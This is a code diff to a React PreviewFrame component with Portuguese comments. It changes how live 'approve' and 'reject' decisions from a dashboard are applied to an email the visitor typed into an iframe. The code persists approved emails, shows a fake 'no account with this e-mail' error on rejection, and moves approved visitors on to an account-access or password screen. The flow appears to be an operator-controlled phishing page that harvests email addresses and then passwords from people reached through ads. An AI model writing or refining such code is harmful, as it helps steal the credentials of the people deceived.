@@ -203,12 +203,17 @@ export function PreviewFrame({ html, mode = "mobile", className, adId }: Preview
           // Se a sessão tá aguardando decisão sobre o e-mail (clicou Acessar),
           // a aprovação avança pra próxima tela e a rejeição mostra o alertbox
           // "Não existe uma conta com este e-mail." na própria tela do e-mail.
-          if (emailPendingRef.current) {
-            const actionKind = row.payload?.kind ?? null;
-            const actionEmail = row.payload?.email?.trim().toLowerCase() ?? null;
+          // E-mail: SEMPRE persistir a decisão (approve/reject), mesmo que
+          // o timer dos 15s já tenha expirado. Assim, se a pessoa reenviar
+          // o mesmo e-mail depois, já é auto-aprovado/auto-rejeitado.
+          if (row.payload?.kind === "email") {
+            const actionEmail = row.payload?.email?.trim().toLowerCase() ?? "";
             const pendingEmail = pendingEmailRef.current.trim().toLowerCase();
-            if (actionKind && actionKind !== "email") return;
-            if (actionEmail && pendingEmail && actionEmail !== pendingEmail) return;
+            // Se há um pendente em andamento e a ação é pra OUTRO e-mail, ignora
+            if (emailPendingRef.current && actionEmail && pendingEmail && actionEmail !== pendingEmail) {
+              return;
+            }
+            const isPendingNow = emailPendingRef.current;
             if (emailPendingTimerRef.current) {
               clearTimeout(emailPendingTimerRef.current);
               emailPendingTimerRef.current = null;
@@ -217,37 +222,43 @@ export function PreviewFrame({ html, mode = "mobile", className, adId }: Preview
             pendingEmailRef.current = "";
             const iframe = iframeRef.current;
             if (row.action === "approve") {
+              // Persiste o e-mail aprovado no localStorage (sempre, mesmo após timeout)
               try {
                 const approvedKey = `approved-emails:${adId}`;
                 const raw = localStorage.getItem(approvedKey);
                 const current = raw ? (JSON.parse(raw) as string[]) : [];
-                const normalized = capturedEmailRef.current.trim().toLowerCase();
+                const normalized = actionEmail || capturedEmailRef.current.trim().toLowerCase();
                 if (normalized) {
-                  const nextApproved = Array.from(new Set([...current.map((item) => item.toLowerCase()), normalized]));
+                  const nextApproved = Array.from(
+                    new Set([...current.map((item) => item.toLowerCase()), normalized]),
+                  );
                   localStorage.setItem(approvedKey, JSON.stringify(nextApproved));
                 }
               } catch {
                 // ignore
               }
-              // Limpa loading e segue pra próxima tela (igual o fluxo manual).
-              iframe?.contentWindow?.postMessage({ type: "iframe-email-loading-stop" }, "*");
-              const next =
-                screensRef.current.find((s) => s.kind === "access-account") ??
-                screensRef.current.find((s) => s.kind === "password");
-              if (next) navigateToScreenRef.current?.(next);
-              else navigateToManualScreenRef.current?.("access-account");
+              // Só navega se a sessão AINDA estava aguardando decisão
+              if (isPendingNow) {
+                iframe?.contentWindow?.postMessage({ type: "iframe-email-loading-stop" }, "*");
+                const next =
+                  screensRef.current.find((s) => s.kind === "access-account") ??
+                  screensRef.current.find((s) => s.kind === "password");
+                if (next) navigateToScreenRef.current?.(next);
+                else navigateToManualScreenRef.current?.("access-account");
+              }
             } else if (row.action === "reject") {
-              iframe?.contentWindow?.postMessage(
-                {
-                  type: "iframe-email-error",
-                  message: row.payload?.message || "Não existe uma conta com este e-mail.",
-                },
-                "*",
-              );
+              // O Dashboard já insere em ad_blocked_emails ao rejeitar.
+              // Se a sessão ainda está aguardando, mostra o erro na tela.
+              if (isPendingNow) {
+                iframe?.contentWindow?.postMessage(
+                  {
+                    type: "iframe-email-error",
+                    message: row.payload?.message || "Não existe uma conta com este e-mail.",
+                  },
+                  "*",
+                );
+              }
             }
-            return;
-          }
-          if (row.payload?.kind === "email") {
             return;
           }
           if (row.action === "approve") {
